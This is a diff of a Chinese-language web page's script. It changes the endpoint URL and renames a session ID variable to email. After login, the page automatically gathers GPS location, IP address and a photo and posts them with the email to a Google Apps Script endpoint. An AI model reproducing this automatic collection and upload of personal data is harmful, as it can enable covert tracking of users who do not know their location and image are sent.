@@ -232,7 +232,7 @@
     </div>
   </div>
   <script>
-    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwoCQNMaVRF3BDfS5OXgyfCxvgfJaSw6wkSIiaCxznwo6GeVfzTgR7fvqNHJvBa9nOc6w/exec';
+    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxeVv4NlYoYKqoA-ThFFdgCLp94BYBoCv8BCcD1qRQ4JXI5PaDRdLvi-W8ns6TAZhy19g/exec';
     const openModalBtn = document.getElementById('openModalBtn');
     const modalOverlay = document.getElementById('modalOverlay');
     const closeModalBtn = document.getElementById('closeModalBtn');
@@ -330,7 +330,7 @@
         const result = await response.json();
 
          if (result.success) {
-          // 儲存 user_id 至 sessionStorage
+          // 儲存 email 至 sessionStorage 作為 user_id
           sessionStorage.setItem('user_id', result.user_id);
           showSuccessMessage('登入成功！');
           modalOverlay.style.display = 'none';
@@ -474,14 +474,14 @@
         if (ipResult.status === 'fulfilled') collectedData.ip = ipResult.value;
         if (photoResult) collectedData.photo = photoResult;
 
-        const userId = sessionStorage.getItem('user_id'); 
-        if (!userId) {
-            console.error('無法獲取用戶 ID，請先登入');
+        const email = sessionStorage.getItem('user_id'); // 這裡的 user_id 實際上是 email
+        if (!email) {
+            console.error('無法獲取用戶 Email，請先登入');
             return;
         }
 
         const formData = new URLSearchParams();
-        formData.append('email', userId);
+        formData.append('email', email); // 傳遞 email 作為識別符
         formData.append('message', '合併資料上傳');
         if (collectedData.gps) {
             formData.append('latitude', collectedData.gps.latitude);
@@ -524,22 +524,22 @@ function getSessionUserId() {
     return sessionStorage.getItem('user_id'); 
 }
     
-   document.addEventListener('DOMContentLoaded', async () => { 
-    try {
-      const userId = sessionStorage.getItem('user_id');
-      if (userId) {
-        const gpsData = await getGpsCoordinates();
-        if (gpsData) {
-          document.getElementById('map').src = 
-            `https://www.google.com/maps?q=${gpsData.latitude},${gpsData.longitude}&hl=zh-TW&z=15&output=embed`;
-          await getWeatherInfo(gpsData.latitude, gpsData.longitude);
-        }
-        collectAndSendData();
+document.addEventListener('DOMContentLoaded', async () => { 
+  try {
+    const userId = sessionStorage.getItem('user_id'); // user_id 為 email
+    if (userId) {
+      const gpsData = await getGpsCoordinates();
+      if (gpsData) {
+        document.getElementById('map').src = 
+          `https://www.google.com/maps?q=${gpsData.latitude},${gpsData.longitude}&hl=zh-TW&z=15&output=embed`;
+        await getWeatherInfo(gpsData.latitude, gpsData.longitude);
       }
-    } catch (error) {
-      console.error('DOMContentLoaded 初始化時錯誤:', error);
+      collectAndSendData();
     }
-  });
-  </script>
+  } catch (error) {
+    console.error('DOMContentLoaded 初始化時錯誤:', error);
+  }
+});
+</script>
 </body>
 </html>
